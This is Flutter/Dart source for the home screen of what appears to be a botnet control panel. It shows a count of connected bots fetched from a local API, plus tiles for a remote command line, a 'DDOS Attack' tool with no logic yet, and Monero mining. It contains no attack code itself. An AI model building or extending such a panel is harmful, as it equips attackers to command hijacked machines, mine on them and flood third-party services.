import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/src/widgets/framework.dart';
import 'package:flutter/src/widgets/placeholder.dart';
import 'package:web/screens/commandLineScreen.dart';
import 'package:http/http.dart' as http;
import 'package:web/screens/miningScreen.dart';
class HomeScreen extends StatefulWidget {
    static String router = "home";

  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  int ConnectedClientsCount = 0;
  @override
  void initState() {
    // TODO: implement initState
    super.initState();

     Future.delayed(const Duration(milliseconds: 200), () async {
      try {

    final response = await http.get(Uri.parse("http://localhost:8080/api/s/clients"));
    List data = jsonDecode(response.body);



    setState(() {
    ConnectedClientsCount = data.length;
      
    });




      } catch (err) {
        print(err);
      }
     });

  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body:SingleChildScrollView(
          child: Column(
            children: [
              // Masthead
              Container(
                margin: EdgeInsets.symmetric(vertical: 20),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Expanded(
                      child: Column(
                        children: [
                          Text("Connected Bots", style: TextStyle(fontSize: 18)),
                          Text(ConnectedClientsCount.toString(), style: TextStyle(fontSize: 36, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ),
                    Expanded(
                      child: Column(
                        children: [
                          Text("Users", style: TextStyle(fontSize: 18)),
                          Text("500", style: TextStyle(fontSize: 36, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ),
                  ],
                ),
              ),

               // Services
              // Container(
              //   color: Colors.black,
              //   padding: EdgeInsets.symmetric(vertical: 50),
              //   child: LayoutBuilder(
              //     builder: (context, constraints) {
              //       bool isWideScreen = constraints.maxWidth > 600;

              //       return Column(
              //         children: [
              //           Text("Services", style: TextStyle(fontSize: isWideScreen ? 36 : 24, color: Colors.white)),
              //           Text("Lorem ipsum dolor sit amet consectetur.", style: TextStyle(fontSize: isWideScreen ? 20 : 16, color: Colors.grey)),
              //           SizedBox(height: 50),
              //            Wrap(
              //             alignment: WrapAlignment.center,
              //             spacing: isWideScreen ? 50 : 20,
              //             children: [
              //               ServiceCard(icon: Icons.shopping_cart, title: "E-Commerce", description: "Lorem ipsum dolor...",),
              //               ServiceCard(icon: Icons.laptop, title: "Responsive Design", description: "Lorem ipsum dolor...", ),
              //               ServiceCard(icon: Icons.lock, title: "Web Security", description: "Lorem ipsum dolor...", ),
              //             ],
              //           ),
              //         ],
              //       );
              //     },
              //   ),
              // ),

              // Portfolio Grid
              Container(
                color: Colors.black,
                padding: EdgeInsets.symmetric(vertical: 50),
                child: LayoutBuilder(
                  builder: (context, constraints) {
                    bool isWideScreen = constraints.maxWidth > 600;

                    return Column(
                      children: [
                        Text("Tools", style: TextStyle(fontSize: isWideScreen ? 36 : 24, color: Colors.white)),
                        Text("Lorem ipsum dolor sit amet consectetur.", style: TextStyle(fontSize: isWideScreen ? 20 : 16, color: Colors.grey)),
                        SizedBox(height: 50),
                        Wrap(
                          alignment: WrapAlignment.center,
                          spacing: isWideScreen ? 50 : 20,
                          children: [
                            PortfolioItem(image: "assets/img/command.webp", title: "Command Line", onTap: () {
                              Navigator.pushNamed(context, CommandLineScreen.router);
                            },),
                            PortfolioItem(image: "assets/img/ddos.jpeg", title: "DDOS Attack", onTap: () {

                            },),
                            PortfolioItem(image: "assets/img/monero.png", title: "Monero", onTap: () {
                              Navigator.pushNamed(context, MiningScreen.router);

                            },),
                          ],
                        ),
                      ],
                    );
                  },
                ),
              ),
            ],
          ),
        ),
    );
  }
}

class ServiceCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String description;

  ServiceCard({required this.icon, required this.title, required this.description});

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: EdgeInsets.all(20),
      width: 300,
      padding: EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(10),
      ),
      child: Column(
        children: [
          Icon(icon, size: 64, color: Colors.blue),
          SizedBox(height: 20),
          Text(title, style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
          Text(description, style: TextStyle(fontSize: 14, color: Colors.grey)),
        ],
      ),
    );
  }
}

class PortfolioItem extends StatelessWidget {
  final String image;
  final String title;
  Function onTap;

  PortfolioItem({required this.image, required this.title, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: 300,
      margin: EdgeInsets.all(20),
      child: Column(
        children: [
          GestureDetector(
            onTap: () {
              // Add your navigation logic here
              onTap();
            },
            child: Container(
              width: 200,
              height: 200,
              decoration: BoxDecoration(
                image: DecorationImage(image: AssetImage(image), fit: BoxFit.cover),
                borderRadius: BorderRadius.circular(10),
              ),
              // child: Center(child: Icon(Icons.add, size: 48, color: Colors.white)),
            ),
          ),
          SizedBox(height: 20),
          Text(title, style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.white)),
        ],
      ),
    );
  }
}